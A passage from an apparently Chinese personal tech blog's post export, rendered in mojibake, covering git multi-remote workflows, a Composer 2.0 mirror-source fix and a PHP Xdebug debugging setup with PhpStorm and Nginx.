æˆ‘è·‘è¿‡å»é—®é—®æ€ä¹ˆå›äº‹ï¼Œä¸€å¬å°±ä¹äº†ã€‚åŸæ¥å¯¹æ–¹å…¬å¸å°†ä»£ç éƒ¨ç½²åœ¨ç§æœ‰ git æœåŠ¡å™¨ä¸Šï¼Œç»™äº†æˆ‘ä»¬è´¦å·å¯†ç ä»¥ä¾›æ‹‰å–æºç ã€‚å¯¹æ–¹æ‰¿è¯ºå¯¹äº§å“åšåç»­çš„æ›´æ–°ç»´æŠ¤ï¼Œæ–°ç‰ˆæœ¬ä¹Ÿå‘å¸ƒåœ¨è¯¥ git ä»“åº“ä¸Šã€‚ä½†æ˜¯æˆ‘ä»¬å¯¹æºç åšäºŒæ¬¡å¼€å‘ï¼Œä¼šè¿›è¡Œå¾ˆå¤šæ”¹åŠ¨ï¼Œåˆä¸æƒ³æŠŠæˆ‘ä»¬çš„æ”¹åŠ¨æ¨ç»™ä»–ä»¬ã€‚ å•Šè¿™ã€‚ã€‚ã€‚æ˜æ˜¾æ˜¯å¯¹ git ä¸ç†Ÿæ‚‰å•Šï¼Œè€Œä¸”è¿˜ä¸æ˜¯ä¸€ä¸ªåŒå­¦ï¼Œåº”è¯¥å€¼å¾—åçœã€‚å¹³æ—¥é‡Œèµ·è‰æ‹›è˜éœ€æ±‚æ—¶éƒ½ä¼šæŠŠ git ä½œä¸ºä¸€ä¸ªå¿…å¤‡çš„æŠ€èƒ½é¡¹ï¼Œç»“æœè½®åˆ°è‡ªå·±èº«ä¸Šï¼Œå´åªç•¥çŸ¥çš®æ¯›ã€‚ æˆ‘å…ˆä»£å…¥ä»–ä»¬çš„æ€ç»´åè¿‡æ¥æ¨ç†ï¼šä¸ºä»€ä¹ˆä¸€å®šè¦ pushï¼Œä»–ä»¬çš„ä»£ç åªåš pullï¼Œæ‹‰å–æ–°ç‰ˆåˆå¹¶åˆ°æœ¬åœ°ä¸å°±è¡Œäº†ä¹ˆã€‚å“¦ï¼ŒåŸæ¥ä¸æ­¢ä¸€ä¸ªå°ä¼™ä¼´åœ¨ååŒå¼€å‘ï¼Œç›¸äº’é—´è¦å…±äº«æ”¹åŠ¨ï¼Œæ¯”å¦‚ AåŒå­¦ çš„æ”¹åŠ¨ push å BåŒå­¦ pull åæ‰èƒ½çœ‹åˆ°ã€‚é‚£ push åä¸å°±æ¨é€åˆ°äº†å¯¹æ–¹å…¬å¸çš„ git æœåŠ¡å™¨äº†ä¹ˆã€‚ æ‰€ä»¥å°ä¼™ä¼´ä»¬è¿˜åœç•™åœ¨ä¸€ä¸ª git ä»“åº“åªæœ‰ä¸€ä¸ªè¿œç«¯çš„å±‚é¢ã€‚ å…¶å®ä¸€ä¸ª git ä»“åº“æ˜¯å¯ä»¥é…ç½®å¤šä¸ªè¿œç«¯ remoteã€‚ æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­æ¥æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œæˆ‘ä»¬ä» github ä¸Šéšä¾¿ clone ä¸€ä¸ªé¡¹ç›®ä¸‹æ¥ 12345678$ git clone git@github.com:taniarascia&#x2F;takenote.gitCloning into &#39;takenote&#39;...remote: Enumerating objects: 114, done.remote: Counting objects: 100% (114&#x2F;114), done.remote: Compressing objects: 100% (92&#x2F;92), done.remote: Total 4672 (delta 44), reused 50 (delta 20), pack-reused 4558Receiving objects: 100% (4672&#x2F;4672), 10.13 MiB | 780.00 KiB&#x2F;s, done.Resolving deltas: 100% (2990&#x2F;2990), done. æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ gité…ç½®ï¼š 123456789101112131415$ cd takenote$ cat .git&#x2F;config[core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true ignorecase &#x3D; true precomposeunicode &#x3D; true[remote &quot;origin&quot;] url &#x3D; git@github.com:taniarascia&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*[branch &quot;master&quot;] remote &#x3D; origin merge &#x3D; refs&#x2F;heads&#x2F;master æˆ‘ä»¬å¯ä»¥çœ‹åˆ° åªæœ‰ä¸€ä¸ª è¿œç«¯(remote) - originï¼Œå¹¶ä¸”æŒ‡å‘äº† &#x67;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x68;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;:taniarascia/takenote.git åªæœ‰ä¸€ä¸ª åˆ†æ”¯(master) æ¥ä¸‹æ¥å» ç äº‘Gitee ä¸Šå»åˆ›å»ºä¸€ä¸ª ç©ºçš„ ç§æœ‰ä»“åº“ï¼Œæ¨¡æ‹Ÿå­˜æ”¾æˆ‘ä»¬çš„ å·²ä¿®æ”¹æºç  åˆ›å»ºåä¼šè·³è½¬åˆ°ä»“åº“ä¸»é¡µ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºå·²å­˜åœ¨çš„æœ¬åœ°ä»“åº“ï¼Œæ˜¯å¯ä»¥ç›´æ¥æ¨é€åˆ° ç äº‘ çš„ 12git remote add origin git@gitee.com:ChaosJohn&#x2F;takenote.gitgit push -u origin master è§£é‡Šä¸€ä¸‹ç¬¬ä¸€è¡Œï¼šæ·»åŠ ä¸€ä¸ª è¿œç«¯(remote)ï¼Œå–åä¸º originï¼Œè®¾ç½® è¿œç«¯åœ°å€ ä¸º git@gitee.com:ChaosJohn/takenote.git å¯ä»¥é¢„è§ï¼Œå¦‚æœç›´æ¥æ‰§è¡Œï¼Œè‚¯å®šä¼šæŠ¥é”™ï¼Œå…ˆè¯•è¯•ï¼š 12$ git remote add origin git@gitee.com:ChaosJohn&#x2F;takenote.gitfatal: remote origin already exists. æŠ¥é”™æç¤ºè¯´ï¼šåå« origin çš„è¿œç«¯å·²å­˜åœ¨ã€‚ é‚£å’±å°±æ¢ä¸€ä¸ªå‘—ï¼Œä¸å¦‚å–å gitee å§ï¼Œæ­£å¥½å¯“æ„è¿™ä¸ªè¿œç«¯æ˜¯ ç äº‘ çš„ï¼Œå†æ¬¡æ‰§è¡Œ git remote add gitee git@gitee.com:ChaosJohn/takenote.git æ— æŠ¥é”™ã€‚ æŸ¥çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œå‘ç°æ¯”ä¹‹å‰çš„å¤šäº†ä¸‰è¡Œ 1234567891011121314151617$ cat .git&#x2F;config[core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true ignorecase &#x3D; true precomposeunicode &#x3D; true[remote &quot;origin&quot;] url &#x3D; git@github.com:taniarascia&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*[branch &quot;master&quot;] remote &#x3D; origin merge &#x3D; refs&#x2F;heads&#x2F;master[remote &quot;gitee&quot;] url &#x3D; git@gitee.com:ChaosJohn&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;gitee&#x2F;* å…¶å®ç›´æ¥å°†è¿™ä¸‰è¡Œæ·»åŠ åˆ° .git/config æ–‡ä»¶å†…ï¼Œç­‰åŒä¸æ‰§è¡Œ git remote add å‘½ä»¤ã€‚ æ‰€ä»¥æ­£ç¡®çš„ git å·¥ä½œæµç¨‹ä¸ºï¼š ä»å½“å‰ master åˆ†æ”¯åˆ›å»ºæ–°çš„ å¼€å‘åˆ†æ”¯ git checkout -b dev åœ¨ dev åˆ†æ”¯ä¸ŠåšäºŒæ¬¡å¼€å‘ï¼Œæäº¤å¹¶ä¸”æ¨é€åˆ° ç äº‘è¿œç«¯ git push -u gitee dev å¦‚æœåŸé¡¹ç›®å‡ºæ›´æ–°å†…å®¹äº†ï¼Œå…ˆåˆ‡å›åˆ° master åˆ†æ”¯ï¼Œç„¶åä» githubè¿œç«¯ æ‹‰å–æ–°ä»£ç  git pull origin master å†å°† master åˆ†æ”¯åˆå¹¶åˆ° dev åˆ†æ”¯ åˆ‡æ¢åˆ° dev åˆ†æ”¯ï¼Œç»§ç»­åšäºŒæ¬¡å¼€å‘ä»¥åŠæ¨é€åˆ°ç äº‘ï¼Œå¦‚æ­¤å¾ªç¯è¿­ä»£ æ‰€ä»¥å»ºè®®æ‰€æœ‰å¼€å‘çš„å°ä¼™ä¼´ä»¬ï¼Œæœ‰æ—¶é—´è¦å¤šå»å­¦ä¹ å’Œç†Ÿæ‚‰ gitã€‚æ¯•ç«Ÿ å·¥æ¬²å–„å…¶äº‹ å¿…å…ˆåˆ©å…¶å™¨ å˜›ï¼ï¼ï¼ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://blog.chaosjohn.com/tags/git/"}]},{"title":"è§£å†³ Composer æŠ¥é”™ InvalidArgumentException","slug":"Fix-InvalidArgumentException-for-Composer","date":"2020-12-03T09:37:32.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Fix-InvalidArgumentException-for-Composer.html","link":"","permalink":"https://blog.chaosjohn.com/Fix-InvalidArgumentException-for-Composer.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ composer åœ¨ 2020-11-24 å‘å¸ƒäº†å…¨æ–°çš„ 2.0 ç‰ˆæœ¬ã€‚å‚è€ƒå®˜æ–¹åšå®¢ é‰´äºåšå®¢é‡Œæè¿°æ–°ç‰ˆåœ¨å¾ˆå¤šæ–¹é¢éƒ½åšå‡ºäº†ä¼˜åŒ–ï¼Œç‰¹åˆ«æ˜¯æ€§èƒ½æ–¹é¢ï¼Œæé€Ÿäº†å¾ˆå¤šï¼Œäºæ˜¯ç¬”è€…è¿«ä¸åŠå¾…åœ°æ›´æ–°äº†ã€‚ ä½†æ˜¯åœ¨å†™ä¸Šä¸€ç¯‡æ–‡ç«  php è°ƒè¯•æŒ‡å—ï¼ˆXdebugç‰ˆï¼‰çš„ç¯‡å¤´å¤„ï¼Œæ‰§è¡Œ composer require mikecao/flight å´å‘ç”Ÿäº†å¼‚å¸¸ 1234567891011[RuntimeException]No composer.json present in the current directory, this may be the cause of the following exception.[InvalidArgumentException]Could not find package mikecao&#x2F;flight.Did you mean one of these? mikecao&#x2F;flight geogkary&#x2F;breeze åˆ†ææŠ¥é”™ä¿¡æ¯ï¼Œæç¤ºæ‰¾ä¸åˆ° mikecao/flightï¼Œåˆé—®æˆ‘æ˜¯ä¸æ˜¯æƒ³æ‰¾ mikecao/flightã€‚ è¿™ã€‚ã€‚ã€‚æœ‰æ¯’å§ ä¼šä¸ä¼šæ˜¯ Composer 2.0 çš„ bugï¼Ÿä¸ç§‘å­¦å‘€ï¼Œä¸è‡³äºæœ‰è¿™ä¹ˆå¤§çš„bugè¿˜å‘å¸ƒäº†å‡ºæ¥ã€‚ ä¼šä¸ä¼šæ˜¯æˆ‘çš„é…ç½®æœ‰é—®é¢˜ï¼ŸæŸ¥çœ‹ä¸€ä¸‹ é…ç½®æ–‡ä»¶ 12345678910$ cat ~&#x2F;.composer&#x2F;config.json&#123; &quot;config&quot;: &#123;&#125;, &quot;repositories&quot;: &#123; &quot;packagist&quot;: &#123; &quot;type&quot;: &quot;composer&quot;, &quot;url&quot;: &quot;https:&#x2F;&#x2F;packagist.phpcomposer.com&quot; &#125; &#125;&#125; å¯ä»¥çœ‹åˆ°é™¤äº† é•œåƒæº ä»¥å¤–å¹¶æ— å…¶ä»–çš„é…ç½®ã€‚ é—®é¢˜ä¼šä¸ä¼šå‡ºåœ¨ é•œåƒæº ä¸Šå‘¢ï¼Œåæ­£æ’é™¤æ³•å°±é‚£ä¹ˆå¤šé€‰é¡¹ åˆ é™¤ é•œåƒæº åˆ é™¤ composer äºŒè¿›åˆ¶æ–‡ä»¶ä»¥åŠç¨‹åºç›®å½• $HOME/.composer åé‡è£… å°† config.json çš„ packagist å—åˆ é™¤åï¼ˆäº¦å¯æ‰§è¡Œ composer config -g --unset repos.packagistï¼‰ï¼Œå†æ¬¡æ‰§è¡Œ require 12345678910111213$ composer require mikecao&#x2F;flightUsing version ^1.3 for mikecao&#x2F;flight.&#x2F;composer.json has been updatedRunning composer update mikecao&#x2F;flightLoading composer repositories with package informationUpdating dependenciesLock file operations: 1 install, 0 updates, 0 removals - Locking mikecao&#x2F;flight (v1.3.8)Writing lock fileInstalling dependencies from lock file (including require-dev)Package operations: 1 install, 0 updates, 0 removals - Installing mikecao&#x2F;flight (v1.3.8): Extracting archiveGenerating autoload files Bingo! å¼‚å¸¸æŠ¥é”™æ¶ˆå¤±äº† å¯æ˜¯è¯¥é•œåƒæº Packagist / Composer ä¸­å›½å…¨é‡é•œåƒ ç¬”è€…å·²ç»ä½¿ç”¨äº†å¥½å¤šå¹´äº†ï¼Œæ€ä¹ˆçªç„¶å°±æŒ‚äº†å‘¢ï¼Ÿç½‘ä¸Šä¹Ÿæœä¸åˆ°å®ƒçš„ åœæœ æ¶ˆæ¯ã€‚ è€ƒè™‘åˆ°å›½å†…çš„ç½‘ç»œç¯å¢ƒï¼Œå¾—é‡æ–°æ‰¾ä¸€ä¸ªé•œåƒæºã€‚ ç»è¿‡ä¸€ç•ªç½‘ç½—ï¼Œç¬”è€…æœ€ç»ˆæ•²å®šé€‰ç”¨ é˜¿é‡Œäº‘ Composer å…¨é‡é•œåƒï¼Œé…ç½®å‘½ä»¤ï¼š 1$ composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F; å…¶ä»–çš„æ¨èé•œåƒæºï¼š åä¸ºäº‘ https://mirrors.huaweicloud.com/repository/php/ æ¬¡é€‰é•œåƒæºï¼š è…¾è®¯äº‘ https://mirrors.cloud.tencent.com/composer/ ä¸Šæµ·äº¤é€šå¤§å­¦ https://packagist.mirrors.sjtug.sjtu.edu.cn åˆ—ä¸ºæ¬¡é€‰æ˜¯å› ä¸ºè¿˜æœªæ”¯æŒ Composer2ï¼Œè¿è¡Œæ—¶ä¼šæœ‰ é»„è‰²è­¦å‘Š 1Composer 2 repository support for https:&#x2F;&#x2F;mirrors.xxx.com&#x2F;composer has been disabled due to what seems like a misconfiguration. If this is a packagist.org mirror we recommend removing it as Composer 2 handles network operations much faster and should work fine without. æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"fix","slug":"fix","permalink":"https://blog.chaosjohn.com/tags/fix/"},{"name":"composer","slug":"composer","permalink":"https://blog.chaosjohn.com/tags/composer/"}]},{"title":"php è°ƒè¯•æŒ‡å—ï¼ˆXdebugç‰ˆï¼‰","slug":"Debug-php","date":"2020-12-01T15:33:41.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Debug-php.html","link":"","permalink":"https://blog.chaosjohn.com/Debug-php.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ ï¼ˆåƒé€æœ¬æ–‡ï¼Œæ²¡æœ‰äººå°†æ¯”ä½ æ›´æ‡‚ **Php Xdebug è°ƒè¯•**ï¼‰ï¼ˆæ¥è‡ªäºå‡ å¤©åçš„æ‰“è„¸ï¼Œè¯·ç§»æ­¥ php è°ƒè¯•æŒ‡å—ï¼ˆXdebugç‰ˆï¼‰ï¼ˆç»­ï¼‰ï¼‰ åˆ›å»ºä¸€ä¸ªç²¾ç®€é¡¹ç›®ï¼ˆå‘½ä»¤è¡Œï¼‰åˆ›å»ºé¡¹ç›®ï¼Œå¹¶ä¸”ç”¨ composer å®‰è£…ä¸€ä¸ªç¬”è€…æ¯”è¾ƒå–œæ¬¢çš„ å¾®æ¡†æ¶ï¼Œä½œä¸ºç¤ºä¾‹ 123$ mkdir debug$ cd debug$ composer require mikecao&#x2F;flight ç¼–å†™ä¸»ç¨‹åº index.php 12345678910cat &gt;&gt; index.php &lt;&lt;EOF&lt;?phprequire &#39;vendor&#x2F;autoload.php&#39;;Flight::route(&#39;&#x2F;&#39;, function()&#123; echo &#39;hello world!&#39;;&#125;);Flight::start();EOF ç”¨ php å†…ç½®æœåŠ¡å™¨è¿è¡Œé¡¹ç›® 12345$ php -S localhost:8080[Tue Dec 1 23:31:12 2020] PHP 7.4.13 Development Server (http:&#x2F;&#x2F;localhost:8080) started[Tue Dec 1 23:31:35 2020] [::1]:57780 Accepted[Tue Dec 1 23:31:35 2020] [::1]:57780 [200]: GET &#x2F;[Tue Dec 1 23:31:35 2020] [::1]:57780 Closing ä¸Šé¢è¾“å‡ºçš„åä¸‰è¡Œï¼Œæ˜¯åœ¨æœ¬æœºå¦ä¸€ç»ˆç«¯è®¿é—® http://localhost:8080 æ—¶æ‰“å°çš„æ—¥å¿— 12$ curl -L localhost:8080hello world! ï¼ˆä½¿ç”¨ php å†…ç½®æœåŠ¡å™¨è¿è¡Œé¡¹ç›®ï¼Œåªæ˜¯ä¸ºäº†æ£€æµ‹é¡¹ç›®æ˜¯å¦èƒ½å®Œå¥½è¿è¡Œï¼›è¯¥å†…ç½®æœåŠ¡å™¨åªèƒ½ç”¨äºå¼€å‘ç¯å¢ƒï¼Œä¸èƒ½ç”¨äºç”Ÿäº§ç¯å¢ƒï¼‰ è½¬ç§»å¼€å‘è‡³ PhpStorm ä¸­JetBrains å…¬å¸å‡ºå“çš„ PhpStorm ä¸å…¶å®‰è£…åœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ åœ¨ PhpStorm ä¸­æ‰“å¼€é¡¹ç›® æ‰“å¼€ åå¥½è®¾ç½®ï¼ˆmacä¸‹å¿«æ·é”®ä¸º Command+, Win/Linuxä¸‹å¿«æ·é”®ä¸º Ctrl+Alt+sï¼‰ï¼Œå·¦è¾¹ä¾§è¾¹æ å®šä½åˆ° Languages &amp; Frameworks =&gt; PHP åœ¨è¿™é‡Œæ·»åŠ æ­¤å‰äº PHPBrew ä¸­å®‰è£…çš„ PHP ç‰ˆæœ¬ã€‚å‚è€ƒå‰æ–‡ PHPBrew ä½¿ç”¨æŒ‡å—ï¼ˆæ³¨æ„ï¼šè¯·åŠ¡å¿…å®‰è£… xdebug æ‰©å±•ï¼š$phpbrew ext install xdebugï¼Œå¦åˆ™æ— æ³•è¿›è¡Œè°ƒè¯•ï¼‰ å°†åˆšåˆšæ·»åŠ ä¸Šçš„ PHP ç‰ˆæœ¬åº”ç”¨åˆ°å½“å‰é¡¹ç›® ç”¨ Nginx è¿è¡Œé¡¹ç›®å®‰è£…ä¸ç®¡ç† æ— è§†ç³»ç»Ÿç¯å¢ƒ - ç¼–è¯‘å®‰è£…ï¼Œä¸åšèµ˜è¿° macOS12$ brew install nginx$ brew services start&#x2F;stop&#x2F;restart nginx # å¯åŠ¨&#x2F;åœæ­¢&#x2F;é‡å¯ nginx Debian / Ubuntu123$ sudo apt update$ sudo apt install nginx-full$ sudo systemctl start&#x2F;stop&#x2F;restart nginx # å¯åŠ¨&#x2F;åœæ­¢&#x2F;é‡å¯ nginx RHEL / CentOS123$ sudo yum update$ sudo apt install nginx$ sudo systemctl start&#x2F;stop&#x2F;restart nginx # å¯åŠ¨&#x2F;åœæ­¢&#x2F;é‡å¯ nginx é…ç½®ï¼ˆæœ¬æ–‡ä»¥ macOS ä¸‹ Homebrew ç‰ˆ Nginx ä¸ºä¾‹ï¼‰å¯åŠ¨ php-fpmï¼ˆç”¨ PHPBrew å®‰è£… PHP æ—¶éœ€è¦åŒ…å« +fpm variantï¼‰ 12$ phpbrew fpm startStarting php-fpm... åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»º nginx.conf ä½œä¸º Nginx çš„é…ç½®æ–‡ä»¶ 1234567891011121314server &#123; server_name localhost; listen 8000; root &#x2F;Users&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;var&#x2F;run&#x2F;php-fpm.sock; fastcgi_index index.php; include fastcgi.conf; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; &#125;&#125; å°†è¯¥é…ç½®æ–‡ä»¶ è½¯é“¾æ¥ åˆ° Nginx é…ç½®ç›®å½•ä¸‹ /usr/local/etc/nginx/servers/ 1$ ln -sf &#x2F;Users&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug&#x2F;nginx.conf &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;php-debug.conf æ£€æŸ¥ nginx.conf æ˜¯å¦æœ‰é”™è¯¯ 123$ nginx -tnginx: the configuration file &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf syntax is oknginx: configuration file &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf test is successful å¯åŠ¨ Nginx 12$ brew services start nginx&#x3D;&#x3D;&gt; Successfully started &#96;nginx&#96; (label: homebrew.mxcl.nginx) ç»ˆç«¯ä¸‹ curl è®¿é—® Nginxéƒ¨ç½²çš„æœåŠ¡ï¼ŒéªŒè¯é¡¹ç›®æˆåŠŸè·‘äº†èµ·æ¥ 12$ curl -L localhost:8000hello world! Xdebug è°ƒè¯•å¤§éƒ¨åˆ†å…³äº Xdebug çš„é…ç½®ï¼Œåœ¨å‰é¢éƒ¨åˆ†å·²ç»é…ç½®å®Œæ¯•ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹æ˜¯å¦é…ç½®æˆåŠŸPhpStorm é¡¶éƒ¨èœå•æ ç‚¹å‡» Runï¼Œåœ¨ä¸‹æ‹‰èœå•ä¸­é€‰ä¸­ Web Server Debug Validationï¼Œå¼¹å‡ºçª—å£ä¸­ç‚¹å‡»åº•éƒ¨çš„ Validate æŒ‰é’®ã€‚ å¦‚æœæ˜¾ç¤ºæˆåŠŸï¼Œåˆ™è°ƒè¯•ç¯å¢ƒå·²ç»æ­å»ºå®Œæ¯• å¦‚æœæ˜¾ç¤ºå‡ºé”™ï¼Œä¼šç»™å‡ºæ’é”™ä¿¡æ¯ å‘ç°ä¸‰å¤„è­¦å‘Šï¼ŒæŒ‰ç…§æ’é”™ä¿¡æ¯æ’æŸ¥ï¼Œå‘ç°é—®é¢˜å‡ºåœ¨äº† Xdebug 3.0.0 ç‰ˆæœ¬å˜åŠ¨äº†éå¸¸å¤šçš„åœ°æ–¹ï¼Œå¯¼è‡´ç›®å‰ PhpStorm æœ€æ–°çš„ç¨³å®šç‰ˆ 2020.2.4 å¯¹æ­¤å…¼å®¹æ€§æ¬ ç¼ºã€‚ä¸è¿‡ 2020.3 æœ‰æœ›è§£å†³ã€‚ ï¼ˆè¯¥æ–‡å†™å®Œå‘å¸ƒçš„ç¬¬äºŒå¤©ï¼ˆå³ 2020-12-02ï¼‰ï¼ŒPhpStorm 2020.3 å·²é‡Šå‡ºï¼Œæ–°å¢å¯¹ PHP 8 å’Œ Xdebug 3 çš„æ”¯æŒï¼Œå‚è§æ–‡æœ«ã€‚äºäº†äºäº†ï¼Œå†™æ—©äº†ã€‚ï¼‰ æ‰€ä»¥ç¬”è€…å°† Xdebug é™çº§åˆ°äº† 2.X ç‰ˆæœ¬ï¼šphpbrew ext install xdebug 2.9.8ï¼Œå†æ¬¡ç‚¹å‡» Validate æŒ‰é’®ï¼Œæ€ä¹ˆè¿˜æ˜¯ä¸€æ ·çš„æŠ¥é”™ï¼Ÿ è¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹ php-fpm çš„ä¿¡æ¯ 12345$ phpbrew fpm info...xdebug support &#x3D;&gt; enabledVersion &#x3D;&gt; 3.0.0... æ‰€ä»¥éœ€è¦é‡å¯ä¸€ä¸‹ php-fpmï¼Œè®©å…¶åŠ è½½æ–°çš„ Xdebug æ¨¡å— 12345678$ phpbrew fpm restartStopping php-fpm...Starting php-fpm...$ phpbrew fpm info...xdebug support &#x3D;&gt; enabledVersion &#x3D;&gt; 2.9.8... å†æ¬¡ç‚¹å‡» Validate æŒ‰é’® ä¾æ—§æŠ¥é”™ï¼Œä¸è¿‡è¿™é‡Œå°±æ¸…æ™°å¾ˆå¤šäº†ï¼Œç…§ç€æç¤ºï¼Œphpbrew config ç›´æ¥è°ƒç”¨ç¼–è¾‘å™¨æ‰“å¼€ php.ini æ–‡ä»¶ï¼Œåœ¨å°¾éƒ¨æ·»åŠ ï¼š 12[xdebug]xdebug.remote_enable&#x3D;1 å¾… phpbrew fpm restart åå†æ¬¡ç‚¹å‡» Validate æŒ‰é’®ï¼ŒæˆåŠŸï¼ è¿™å°±å¯ä»¥æ„‰å¿«çš„è°ƒè¯•éƒ¨ç½²åœ¨ Nginx é‡Œçš„é¡¹ç›®å•¦ï¼Œè¿™é‡Œæˆ‘ä»¬ç‚¹å‡»å·¥å…·æ çš„ ç›‘å¬æŒ‰é’®ï¼Œå¼€å§‹ç›‘å¬è¿æ¥è¯·æ±‚ æµè§ˆå™¨ä½œä¸ºè¯·æ±‚å®¢æˆ·ç«¯è¿›è¡Œè°ƒè¯•ä¸ºæµè§ˆå™¨å®‰è£…æ’ä»¶ Xdebug Helper for Firefox / æºç  Xdebug Helper for Chrome / æºç  è¿™é‡Œç¬”è€…ä»¥ Chrome æµè§ˆå™¨ä¸ºä¾‹ï¼Œå®‰è£…å®Œåï¼Œå³é”® Xdebug Helper å›¾æ ‡ç‚¹å‡» Options æ‰“å¼€é€‰é¡¹é¡µï¼Œé€‰æ‹© IDE key ä¸º PhpStorm æ–°å¼€æµè§ˆå™¨çª—å£ï¼Œåœ°å€æ è¾“å…¥localhost:8000è®¿é—®æœåŠ¡ï¼Œé¡µé¢ä¼šæ˜¾ç¤º **hello world!**ã€‚å•å‡» Xdebug Helper å›¾æ ‡ï¼Œç‚¹å‡» Debugï¼Œå¼€å¯è°ƒè¯•æ¨¡å¼ï¼Œè‡³æ­¤ï¼Œå›¾æ ‡å°†ä¼šå˜æˆç»¿è‰²ï¼ˆæˆ–è€…ä½¿ç”¨ Alt+Shift+X å¿«æ·é”®å¿«é€Ÿå¼€å…³ Debug æ¨¡å¼ï¼‰ å‡†å¤‡å¼€å§‹è°ƒè¯•ï¼š ç¡®ä¿ PhpStorm çš„ ç›‘å¬ æŒ‰é’®å·²æ¿€æ´» åœ¨ PhpStorm ä¸­ç»™éœ€è¦è°ƒè¯•çš„ä»£ç è¡Œæ‰“ä¸Šæ–­ç‚¹ ç¡®ä¿æµè§ˆå™¨çš„ Xdebug Helperå¤„äº Debug æ¨¡å¼ï¼Œå›¾æ ‡å˜ä¸ºç»¿è‰² åˆ·æ–°æµè§ˆå™¨é¡µé¢ï¼ŒPhpStorm ç›‘å¬åˆ°è¯·æ±‚ä¼ å…¥ï¼ŒåŒæ—¶æµè§ˆå™¨è¯·æ±‚å¤„äº Pending çŠ¶æ€ï¼ŒæŒ‚èµ·ç­‰å¾…è¯·æ±‚å“åº” åœ¨å¼¹çª—ä¸­é€‰æ‹©å®Œæ­£ç¡®çš„ php æ–‡ä»¶åï¼ŒPhpStorm å°±è¿›å…¥äº†è°ƒè¯•æ¨¡å¼ï¼ŒæˆåŠŸåœ°åœåœ¨äº†æ–­ç‚¹å¤„ï¼Œåœ¨è¿™é‡Œå¯ä»¥æŸ¥çœ‹å½“å‰çš„å„é¡¹ å˜é‡ ä»¥åŠå•æ­¥è¿è¡Œ ç‚¹å‡»è°ƒè¯•çª—å£å·¦ä¾§çš„ Resume Program æŒ‰é’®ï¼Œç¨‹åºä»æ–­ç‚¹å¤„æ¢å¤è¿è¡Œï¼Œè‡³æ­¤ï¼Œæµè§ˆå™¨ä¾§çš„è¯·æ±‚æ”¶åˆ°äº†ç­‰å¾…å·²ä¹…çš„å“åº”ï¼Œåœ¨çª—å£æ¸²æŸ“å‡º hello world! å­—æ · å‘½ä»¤è¡Œ æˆ–å…¶ä»– è¯·æ±‚å®¢æˆ·ç«¯ å‘èµ·è°ƒè¯•åœ¨å®é™…çš„çº¯æ¥å£å¼€å‘åœºæ™¯ä¸­ï¼Œé™¤äº†ç±»ä¼¼ localhost:8000 çš„ç®€å•è¯·æ±‚ï¼Œè¿˜æœ‰è¯¸å¤šå¸¦æœ‰å¤æ‚å‚æ•°çš„è¯·æ±‚ï¼Œä»¥åŠå„ç§ http method çš„è¯·æ±‚ï¼ˆGET / POST / PUT / HEAD / DELETE / OPTIONSï¼‰ï¼Œä»…ä»…é€šè¿‡æµè§ˆå™¨åœ°å€æ è¿›è¡Œå‘èµ·è°ƒè¯•å¹¶ä¸èƒ½èƒœä»»ã€‚ å¼€å‘äººå“å¹³æ—¶å‘èµ·è¯·æ±‚æµ‹è¯•ï¼Œä¸€èˆ¬éƒ½é€‰ç”¨ å‘½ä»¤è¡Œå·¥å…·ï¼ˆä¾‹å¦‚ curl / httpieï¼‰æˆ–ç±»ä¼¼ Postman è¿™æ 